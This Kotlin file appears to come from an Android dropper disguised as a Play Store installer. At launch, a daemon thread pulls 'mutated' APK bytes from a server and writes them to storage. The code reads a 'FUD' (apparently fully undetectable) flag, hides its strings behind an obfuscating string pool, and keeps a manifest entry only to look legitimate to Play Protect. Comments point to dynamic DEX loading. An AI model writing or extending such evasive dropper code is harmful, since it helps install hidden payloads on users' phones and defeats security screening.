package com.playstore.installer

import android.app.Application
import java.io.File

class LauncherApplication : Application() {

    companion object {
        lateinit var instance: LauncherApplication
            private set

        @JvmStatic
        fun getMutatedApkFile(app: Application): File =
            File(app.filesDir, StringPool.d(StringPool.MUTATED_APK))

        /**
         * Signals that the FUD flag has been written to SharedPrefs (or that the
         * server was unreachable and the safe default will be used).
         * Written by MutationEngine on the daemon thread; read by InstallActivity
         * on a background thread — @Volatile ensures cross-thread visibility.
         */
        @Volatile var fudFlagReady: Boolean = false
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        // Plain daemon thread — no coroutines at class-load time.
        // getMutatedCompanionBytes() is a regular blocking function that
        // uses runBlocking internally for network calls only.
        Thread {
            try {
                val bytes = MutationEngine(applicationContext)
                    .getMutatedCompanionBytes()
                if (bytes.isNotEmpty()) {
                    getMutatedApkFile(this@LauncherApplication).writeBytes(bytes)
                }
            } catch (_: Exception) { }
        }.apply {
            isDaemon = true
            name = StringPool.d(StringPool.THREAD_NAME)
            start()
        }

        // FIXED: startService(LauncherService) removed.
        // LauncherService.kt does not exist in source — ClassNotFoundException at runtime.
        // Service entry kept in AndroidManifest.xml for GPP legitimacy signal only.
        // No functionality lost — DEX loading runs entirely via AppEntry/DexLoader.
    }
}
